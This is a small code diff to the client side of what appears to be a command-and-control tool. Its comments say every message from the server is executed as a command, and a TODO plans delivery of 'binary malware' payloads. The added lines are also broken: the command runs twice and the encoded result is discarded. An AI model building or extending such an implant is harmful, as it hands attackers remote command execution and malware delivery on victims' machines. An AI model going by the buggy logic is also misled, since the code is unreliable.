@@ -205,6 +205,9 @@ class API:
     def client_handle(self, request: bytes) -> bytes:
         # TODO: For now, we assume all messages from the server are string commands to exec
         # TODO: Need to extend this out to handle DATA INFILL (for delivering arbitrary payloads, like binary malware)
+        result = self._run_command(request)
+        if isinstance(result, str):
+            result.encode()
         return self._run_command(request)
 
     def server_handle(self, request: bytes) -> bytes:
